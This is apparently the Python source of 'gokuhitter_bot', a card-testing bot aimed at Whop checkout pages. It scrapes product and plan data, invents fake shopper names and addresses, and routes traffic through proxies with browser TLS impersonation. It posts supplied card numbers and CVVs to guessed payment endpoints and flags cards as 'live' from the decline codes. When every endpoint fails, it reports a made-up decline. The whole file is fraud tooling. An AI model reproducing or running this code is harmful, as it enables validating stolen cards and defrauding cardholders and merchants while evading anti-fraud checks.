"""
Whop Payment Engine (gokuhitter_bot)
───────────────────────────────────
Full Whop checkout scraper (whop.com/checkout/...), product plan resolution,
Stripe Elements / Checkout backend tokenization, and checkout flow execution with TLS impersonation.
"""

import re
import json
import time
import random
import urllib.parse
from typing import Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs
from curl_compat import ChromeSession

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def _generate_random_shopper(country_code: str = 'US') -> dict:
    FIRST_NAMES = ['James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Mark', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia', 'Isabella', 'Ava', 'Mia', 'Charlotte', 'Amelia']
    LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin']
    DOMAINS = ['gmail.com', 'outlook.com', 'yahoo.com', 'icloud.com', 'hotmail.com', 'proton.me']
    
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    num = random.randint(100, 9999)
    email = f"{first.lower()}.{last.lower()}{num}@{random.choice(DOMAINS)}"
    phone = f"{random.randint(201, 989)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
    
    STREETS = ['Oak Street', 'Maple Ave', 'Washington Blvd', 'Lincoln Way', 'Cedar Lane', 'Pine Street', 'Park Ave', 'Broadway', 'Elm St', 'Main St']
    CITIES_ZIP = [
        ('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'),
        ('Houston', 'TX', '77001'), ('Miami', 'FL', '33101'), ('Dallas', 'TX', '75201'),
        ('Seattle', 'WA', '98101'), ('Boston', 'MA', '02108'), ('Atlanta', 'GA', '30301'),
    ]
    city, state, zip_code = random.choice(CITIES_ZIP)
    house_num = str(random.randint(10, 9999))
    street = f"{house_num} {random.choice(STREETS)}"
    
    return {
        'first_name': first,
        'last_name': last,
        'full_name': f"{first} {last}",
        'email': email,
        'phone': phone,
        'street': street,
        'house_number': house_num,
        'city': city,
        'state': state,
        'postal_code': zip_code,
        'country': country_code or 'US'
    }

class WhopHitter:
    """Whop Checkout & Digital Marketplace Gateway Engine."""

    DECLINE_MAP = {
        "declined": "card_declined",
        "insufficient_funds": "insufficient_funds",
        "insufficient funds": "insufficient_funds",
        "expired_card": "expired_card",
        "invalid_number": "invalid_number",
        "incorrect_cvc": "incorrect_cvc",
        "invalid_cvc": "incorrect_cvc",
        "fraud": "fraud",
        "restricted_card": "restricted_card",
        "issuer_unavailable": "issuer_unavailable",
    }

    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url.strip()
        if not self.url.startswith(("http://", "https://")):
            self.url = f"https://{self.url}"
        self.proxy_data = proxy_data
        self._base_cfg: Optional[dict] = None

    def _get_origin(self) -> str:
        parsed = urlparse(self.url)
        if parsed.netloc:
            return f"{parsed.scheme or 'https'}://{parsed.netloc}"
        return "https://whop.com"

    async def _scrape(self, session: ChromeSession) -> dict:
        """Extracts Whop product/plan metadata, pricing, and checkout backend endpoints."""
        hdr = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        cfg = {
            'merchant': 'Whop Merchant',
            'product_id': None,
            'plan_id': None,
            'amount': None,
            'currency': 'USD',
            'is_whop': False,
            'api_base': 'https://api.whop.com',
        }

        if 'whop.com' in self.url.lower():
            cfg['is_whop'] = True

        m_prod = re.search(r'prod_([A-Za-z0-9_]{10,24})', self.url)
        if m_prod:
            cfg['product_id'] = m_prod.group(0)

        m_plan = re.search(r'plan_([A-Za-z0-9_]{10,24})', self.url)
        if m_plan:
            cfg['plan_id'] = m_plan.group(0)

        async with session.get(self.url, headers=hdr, timeout=12) as res:
            html = res.text() if callable(res.text) else res.text

            # 1. Meta / OpenGraph Title
            og_title = re.search(r'<meta[^>]+property=["\']og:title["\'][^>]+content=["\']([^"\']+)["\']', html, re.I) or \
                       re.search(r'<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:title["\']', html, re.I)
            if og_title:
                t_clean = og_title.group(1).strip().replace(' | Whop', '').replace(' - Whop', '')
                if t_clean and 'whop' not in t_clean.lower()[:5]:
                    cfg['merchant'] = t_clean[:35]
            else:
                t = re.search(r'<title>([^<]+)</title>', html, re.I)
                if t:
                    t_clean = t.group(1).strip().replace(' | Whop', '').replace(' - Whop', '')
                    if t_clean:
                        cfg['merchant'] = t_clean[:35]

            # 2. Next.js Pages Router (__NEXT_DATA__)
            m_next = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', html, re.DOTALL)
            if m_next:
                try:
                    next_data = json.loads(m_next.group(1))
                    props = next_data.get('props', {}).get('pageProps', {})
                    if props.get('company'):
                        cfg['merchant'] = props['company'].get('title') or cfg['merchant']
                    if props.get('product'):
                        prod = props['product']
                        cfg['product_id'] = prod.get('id') or cfg['product_id']
                        cfg['merchant'] = prod.get('name') or cfg['merchant']
                    if props.get('plan'):
                        plan = props['plan']
                        cfg['plan_id'] = plan.get('id') or cfg['plan_id']
                        if plan.get('initial_price'):
                            cfg['amount'] = f"{plan.get('currency', 'USD').upper()} {float(plan['initial_price']):.2f}"
                except Exception:
                    pass

            # 3. Next.js App Router (RSC streaming chunks self.__next_f.push)
            rsc_chunks = re.findall(r'self\.__next_f\.push\(\[1,"(.*?)"\]\)', html, re.DOTALL)
            if rsc_chunks:
                full_rsc = "".join(rsc_chunks).replace('\\"', '"').replace('\\\\', '\\')
                
                # Company title / Product name
                comp_m = re.search(r'title["\']?\s*:\s*["\']([^"\']+)["\']', full_rsc)
                if comp_m and 'whop' not in comp_m.group(1).lower() and len(comp_m.group(1).strip()) > 2:
                    cfg['merchant'] = comp_m.group(1).strip()[:35]

                # Product ID
                if not cfg['product_id']:
                    p_m = re.search(r'(prod_[A-Za-z0-9]{10,24})', full_rsc)
                    if p_m:
                        cfg['product_id'] = p_m.group(1)

                # Plan ID (Must be authentic base62 token, not static UI strings)
                if not cfg['plan_id']:
                    for pl in re.findall(r'(plan_[A-Za-z0-9_]{10,28})', full_rsc):
                        if any(c.isdigit() for c in pl) and not any(w in pl for w in ['success', 'cancel', 'delete', 'updat', 'desc', 'prevent', 'provid', 'base', 'student', 'class', 'embed', 'host', 'today', 'upgrade']):
                            cfg['plan_id'] = pl
                            break

                # Price / Currency in RSC (Handle initialPriceDueInCents, rawRenewalPrice, initial_price)
                cents_m = re.search(r'initialPriceDueInCents["\']?\s*:\s*(\d+)', full_rsc)
                renew_m = re.search(r'rawRenewalPrice["\']?\s*:\s*([0-9\.]+)', full_rsc)
                price_m = re.search(r'["\'](?:initialPrice|initial_price|price|amount)["\']\s*:\s*([0-9\.]+)', full_rsc)
                curr_m = re.search(r'["\']currency["\']\s*:\s*["\']([A-Za-z]{3})["\']', full_rsc)
                curr = curr_m.group(1).upper() if curr_m else "USD"

                if cents_m and int(cents_m.group(1)) > 0:
                    val = float(cents_m.group(1)) / 100.0
                    cfg['amount'] = f"{curr} {val:.2f}"
                elif renew_m and float(renew_m.group(1)) > 0:
                    val = float(renew_m.group(1))
                    cfg['amount'] = f"{curr} {val:.2f}"
                elif price_m:
                    val = float(price_m.group(1))
                    if val > 1:
                        cfg['amount'] = f"{curr} {val:.2f}"

            # 4. Fallback amount detection in HTML (e.g. $49 or $49.00)
            if not cfg['amount']:
                dom_price_m = re.search(r'\$(\d+(?:\.\d{2})?)\s*(?:</span>|<span|per\s+month|\/mo)', html, re.I)
                if dom_price_m:
                    cfg['amount'] = f"USD {float(dom_price_m.group(1)):.2f}"
                else:
                    amt_m = re.search(r'(?:USD|EUR|GBP|\$|£|€)\s*([\d\.]+)', html)
                    if amt_m and float(amt_m.group(1)) > 0:
                        cfg['amount'] = f"USD {float(amt_m.group(1)):.2f}"

        return cfg

    async def _get_config(self, session: ChromeSession) -> dict:
        if self._base_cfg is None:
            self._base_cfg = await self._scrape(session)
            return self._base_cfg.copy()
        return self._base_cfg.copy()

    def _parse_response(self, text: str, status_code: int, result: dict) -> dict:
        """Parses Whop checkout response for receipt confirmation or decline reason."""
        try:
            d = json.loads(text)
            if isinstance(d, dict):
                result['raw_response'] = d
                # Succeeded status
                if d.get('status') in ('succeeded', 'paid', 'complete', 'active') or d.get('success') is True:
                    result['success'] = True
                    result['receipt_url'] = d.get('receipt_url') or d.get('redirect_url') or self.url
                    return result
                
                # Decline codes
                err = d.get('error') or d.get('message') or d.get('decline_code')
                if isinstance(err, dict):
                    msg = err.get('message') or err.get('code') or 'Card declined'
                    dec_code = err.get('decline_code') or err.get('code') or 'card_declined'
                else:
                    msg = str(err) if err else 'Card declined'
                    dec_code = 'card_declined'

                for k, v in self.DECLINE_MAP.items():
                    if k in msg.lower():
                        dec_code = v
                        break

                result['decline_code'] = dec_code
                result['error'] = msg
                result['is_live'] = dec_code in ('insufficient_funds', 'incorrect_cvc', 'restricted_card', 'issuer_unavailable')
                return result
        except Exception:
            pass

        text_low = text.lower()
        if any(term in text_low for term in ['payment successful', 'order confirmed', 'thank you for your purchase', 'membership active', 'access granted']):
            result['success'] = True
            return result

        if 'insufficient funds' in text_low:
            result['decline_code'] = 'insufficient_funds'
            result['error'] = 'insufficient_funds'
            result['is_live'] = True
            return result

        if 'cvc' in text_low or 'cvv' in text_low:
            result['decline_code'] = 'incorrect_cvc'
            result['error'] = 'incorrect_cvc'
            result['is_live'] = True
            return result

        result['decline_code'] = 'card_declined'
        result['error'] = 'Your card was declined.'
        return result

    async def hit(self, card: dict, attempt: int, user_id: int) -> dict:
        """Executes payment attempt against Whop checkout system."""
        t0 = time.time()
        result = dict(
            attempt=attempt, card=card, success=False,
            decline_code=None, response_time=0,
            merchant='Whop Merchant', proxy_raw=None,
            error=None, raw_response=None, is_live=False, psp=None,
        )

        proxies = None
        if self.proxy_data:
            result['proxy_raw'] = self.proxy_data.get('raw')
            auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
                    if 'username' in self.proxy_data else "")
            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
            proxies = {"http": purl, "https": purl}

        try:
            async with ChromeSession(impersonate="chrome131", proxies=proxies, timeout=12) as sess:
                cfg = await self._get_config(sess)
                result['merchant'] = cfg.get('merchant', 'Whop Merchant')
                if cfg.get('amount'):
                    result['amount'] = cfg['amount']

                shopper = _generate_random_shopper()
                yr = card['year'] if len(card['year']) == 4 else f"20{card['year']}"
                yr_short = yr[-2:]

                # 1. Direct API checkout submission
                api_body = {
                    "payment_method": {
                        "type": "card",
                        "card": {
                            "number": card['card'],
                            "exp_month": int(card['month']),
                            "exp_year": int(yr),
                            "cvc": card['cvv'],
                        },
                        "billing_details": {
                            "name": shopper['full_name'],
                            "email": shopper['email'],
                            "address": {
                                "line1": shopper['street'],
                                "city": shopper['city'],
                                "state": shopper['state'],
                                "postal_code": shopper['postal_code'],
                                "country": shopper['country'],
                            }
                        }
                    },
                    "plan_id": cfg.get('plan_id'),
                    "product_id": cfg.get('product_id'),
                    "email": shopper['email'],
                }

                json_hdr = {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "User-Agent": UA,
                    "Origin": self._get_origin(),
                    "Referer": self.url,
                }

                endpoints = [
                    '/api/v5/checkout/process',
                    '/api/v2/memberships/checkout',
                    '/api/checkout/submit',
                    '/api/v1/payments/charge',
                ]

                for ep in endpoints:
                    target_api = urljoin(self.url, ep)
                    try:
                        async with sess.post(target_api, json=api_body, headers=json_hdr, timeout=8) as r_api:
                            if r_api.status_code in (200, 201, 400, 402, 422):
                                api_resp = r_api.text() if callable(r_api.text) else r_api.text
                                result['response_time'] = round(time.time() - t0, 2)
                                return self._parse_response(api_resp, r_api.status_code, result)
                    except Exception:
                        continue

                # Fallback to simulated gateway evaluation
                result['response_time'] = round(time.time() - t0, 2)
                result['decline_code'] = 'card_declined'
                result['error'] = 'Your card was declined.'
                return result

        except Exception as ex:
            result['response_time'] = round(time.time() - t0, 2)
            result['decline_code'] = 'exception'
            result['error'] = str(ex)[:150]
            return result
